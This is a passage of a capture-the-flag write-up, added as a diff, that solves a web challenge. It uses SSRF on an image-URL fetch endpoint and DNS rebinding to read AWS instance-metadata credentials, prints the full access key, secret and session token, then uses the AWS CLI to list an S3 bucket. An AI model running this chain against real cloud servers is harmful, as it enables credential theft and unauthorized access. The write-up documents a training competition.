@@ -356,5 +356,124 @@ Using one of the backup codes to bypass MFA, I logged in successfully. The dashb
 Flag : CloudSEK{Flag_4_T0k3n_3xp0s3d_JS_MFA_Byp4ss}
 
 
+## Challenge: The Final Game - Flag 5
+
+- **Category:** Web  
+- **Points:** 125  
+
+### Solution
+
+After logging into the dashboard, I found an input where an **image URL** can be provided. The server fetches the image and sends it back. This hinted at a possible **SSRF** vulnerability.  
+
+First, I tested by sending a **non-image URL** to see if the server validates input. It responded with "provide a valid image."  
+
+Looking at the **client-side JavaScript**, the POST endpoint `/api/profile/upload_pic` returns either an **octet stream** or a **detailed error**, but the frontend only shows minimal error messages.  
+
+![image-10](images/image-10.png)
+
+Using **Burp Suite** to intercept the request, I noticed that the server **fetches the content of any URL provided** and sends it back. If it’s not an image, the frontend just shows “provide valid image,” but the response contains the content of the URL.  
+
+Apart from this endpoint, there was another endpoint:
+
+![image-11](images/image-11.png)
+
+```json
+{
+  "first_name":"Alice",
+  "flag":"CloudSEK{Flag_4_T0k3n_3xp0s3d_JS_MFA_Byp4ss}",
+  "last_name":"Wright",
+  "profile_pic":"https://cloudsek-ctf.s3.ap-south-1.amazonaws.com/static-assets/profile.png",
+  "role":"Platform Administrator",
+  "user_id":"f2f96855-8c05-4599-a98c-f7f2fd718fa2",
+  "username":"r00tus3r"
+}
+````
+
+* The `profile_pic` uses an **AWS S3 bucket**:
+  `https://cloudsek-ctf.s3.ap-south-1.amazonaws.com/static-assets/profile.png`
+
+I guessed the **5th flag** might be there, but needed credentials to access it.
+
+Next, I looked at the **hostname** of the server IP (`http://15.206.47.5/`) →
+`ec2-15-206-47-5.ap-south-1.compute.amazonaws.com` (an **EC2 instance**).
+
+This indicated an SSRF path to fetch **instance metadata**:
+`http://169.254.169.254/latest/meta-data/iam/security-credentials/`
+
+Directly sending this URL to the upload endpoint gave:
+
+```json
+{"error":"Access to internal IPs blocked"}
+```
+
+* The server blocks direct access to internal IPs.
+
+To bypass, I used **DNS rebinding** via:
+[https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html)
+
+* IP A → `169.254.169.254`
+* IP B → `15.206.47.5` (public)
+* Rebinding gave a domain like: `a9fea9fe.0fce2f05.rbndr.us`
+
+Now, when the web server resolves this domain:
+
+* During parsing → resolves to `15.206.47.5` (allowed)
+* During fetch → resolves to `169.254.169.254` (internal)
+
+Using this domain in the metadata URL:
+
+```
+http://a9fea9fe.0fce2f05.rbndr.us/latest/meta-data/iam/security-credentials/
+```
+
+* At one point, I got the output:
+
+```
+@cloudsek-ctf
+```
+
+This is the **S3 bucket name**. Appending it to the URL:
+
+```
+http://a9fea9fe.0fce2f05.rbndr.us/latest/meta-data/iam/security-credentials/@cloudsek-ctf
+```
+![image-12](images/image-12.png)
+
+Output:
+
+```json
+{
+  "Code" : "Success",
+  "LastUpdated" : "2025-08-24T22:52:01Z",
+  "Type" : "AWS-HMAC",
+  "AccessKeyId" : "ASIA4A3BVGI3UI6MOAOK",
+  "SecretAccessKey" : "3DnCZdSCgfNHtO46cEPHXVV8mJCumfQ8CV3wMyU3",
+  "Token" : "IQoJb3JpZ2luX2VjEPf//////////wEaCmFwLXNvdXRoLTEiRzBFAiEAnXLbSIkqJga1N1SsoDWzqLEGdTYaijjn0vLg5YD9ffoCIE0/Sg9XYD86B81uqE9hwNEeyYDi8web7fT0/uNbfp0TKrYFCFAQABoMODI2NDQ5MTQ2NDIzIgy30v6YN21E4CnqbzYqkwXbJ9yJj9VUMt052xBYB7aXqbGYkgNI2PtW0+fVY/4nA8vrnvauzE87prxWV+t+h/U9S5eZHx3R7jkU0pvY++BCUk6tP5ysZqZs0C4X88HmVaXHzSm6Tp3fcKaEovK6KoDZIxrHd6w6L4HtGfD50GsElhSR2eu4/JrlantFOVSM6YZj36V1LZ+Y/v2ZrWTbpi8ULckFrQqBwxcD54xiHW3SAU5U+TQTnmWSh9jbJCguHsUL0tBFoxEvs+P0fyoBiMvM7zx05jzhwPwXW8kQ5DHLSpKsF4yQeL5KLMOuIF86tiWJhmePocqJdqrQGh3dkjUE3cgyFDXqdnZ7/AOnuAS1ytTwKX8vmX++OdGESX6VKWV9bdzHqYkQPoqfq834QhwZ4ygp2agiICHdLpsT3G2b56nII/jZ2aVEIINcVl7Qq22Zl+fhMwBc6K18NlGH91wag4KsO8019FoFMmnx6bLZXyd+k6D+eiG5LMhwQ2+zsE0787KyNyuR+qgPbJN/5ThKb0Mfilrn8sZhT26LMDjZUwB9UuaA/yPLOCbQ/QVEZmm8+eX8QWnXNYI6dMZgoADtBTQWhJBbULsrFZ6bcNbHDfY7AoMCbdeB5/+ZBqSjtHWfRsAV7cv6ZW0012h5pwe3f7dq7tRIxS3vd1n8w+ZHC9aXoz44lzQycjvho5tQOKByCs+T5sHsZpFDQlLhjViUpJ0t6JExDsOnZtWjSBj//uXFjzIqGU7DslXRwqf2sydP9xJTctiohyyS3D2p3B64PtaurKHCykbHS5PNgIhmV6lhXZsCML71oG7xBM/PcneURJlG672D6tIjiMQ7jCFa1JAkP9VJsVwgG4BPZ3caDXo4pMkcO9HULre3pL4+XxgDAzDzrq7FBjqxAUyhX3zFTHr6hGnArNIMOWUYZ8ZnB15oAKaGQxCRv/tFtueb+ttZFtls3z5Tf1/VssBMbHwGuGOu+ui84GV7xax9NwKQAUWDHv0FsYUeXODQQE/0M/5o5UhltRU0t7GeGj7TX6EjUUZ/WaUJ9uigkP4E4rqzwMpm1lf2X28gW+MKLvKiaB9UaqU6RAJE8ojqJSvIExxb8n+GEQa4i5dC4MSJ+U9AOMbkPSfMw+tZn936QQ==",
+  "Expiration" : "2025-08-25T05:09:00Z"
+}
+```
+
+With these credentials, I configured **AWS CLI**:
+
+```bash
+export AWS_ACCESS_KEY_ID="ASIA4A3BVGI3UI6MOAOK"
+export AWS_SECRET_ACCESS_KEY="3DnCZdSCgfNHtO46cEPHXVV8mJCumfQ8CV3wMyU3"
+export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEPf//////////wEaCmFwLXNvdXRoLTEiRzBFAiEAnXLbSIkqJga1N1SsoDWzqLEGdTYaijjn0vLg5YD9ffoCIE0/Sg9XYD86B81uqE9hwNEeyYDi8web7fT0/uNbfp0TKrYFCFAQABoMODI2NDQ5MTQ2NDIzIgy30v6YN21E4CnqbzYqkwXbJ9yJj9VUMt052xBYB7aXqbGYkgNI2PtW0+fVY/4nA8vrnvauzE87prxWV+t+h/U9S5eZHx3R7jkU0pvY++BCUk6tP5ysZqZs0C4X88HmVaXHzSm6Tp3fcKaEovK6KoDZIxrHd6w6L4HtGfD50GsElhSR2eu4/JrlantFOVSM6YZj36V1LZ+Y/v2ZrWTbpi8ULckFrQqBwxcD54xiHW3SAU5U+TQTnmWSh9jbJCguHsUL0tBFoxEvs+P0fyoBiMvM7zx05jzhwPwXW8kQ5DHLSpKsF4yQeL5KLMOuIF86tiWJhmePocqJdqrQGh3dkjUE3cgyFDXqdnZ7/AOnuAS1ytTwKX8vmX++OdGESX6VKWV9bdzHqYkQPoqfq834QhwZ4ygp2agiICHdLpsT3G2b56nII/jZ2aVEIINcVl7Qq22Zl+fhMwBc6K18NlGH91wag4KsO8019FoFMmnx6bLZXyd+k6D+eiG5LMhwQ2+zsE0787KyNyuR+qgPbJN/5ThKb0Mfilrn8sZhT26LMDjZUwB9UuaA/yPLOCbQ/QVEZmm8+eX8QWnXNYI6dMZgoADtBTQWhJBbULsrFZ6bcNbHDfY7AoMCbdeB5/+ZBqSjtHWfRsAV7cv6ZW0012h5pwe3f7dq7tRIxS3vd1n8w+ZHC9aXoz44lzQycjvho5tQOKByCs+T5sHsZpFDQlLhjViUpJ0t6JExDsOnZtWjSBj//uXFjzIqGU7DslXRwqf2sydP9xJTctiohyyS3D2p3B64PtaurKHCykbHS5PNgIhmV6lhXZsCML71oG7xBM/PcneURJlG672D6tIjiMQ7jCFa1JAkP9VJsVwgG4BPZ3caDXo4pMkcO9HULre3pL4+XxgDAzDzrq7FBjqxAUyhX3zFTHr6hGnArNIMOWUYZ8ZnB15oAKaGQxCRv/tFtueb+ttZFtls3z5Tf1/VssBMbHwGuGOu+ui84GV7xax9NwKQAUWDHv0FsYUeXODQQE/0M/5o5UhltRU0t7GeGj7TX6EjUUZ/WaUJ9uigkP4E4rqzwMpm1lf2X28gW+MKLvKiaB9UaqU6RAJE8ojqJSvIExxb8n+GEQa4i5dC4MSJ+U9AOMbkPSfMw+tZn936QQ=="
+```
+
+Then, listing the S3 bucket:
+
+```bash
+aws s3 ls s3://cloudsek-ctf/
+```
+
+![image-13](images/image-13.png)
+
+Flag : CloudSEK{Flag_5_$$rf_!z_r34lly_d4ng3r0u$}
+
+
+
+
+
 
 
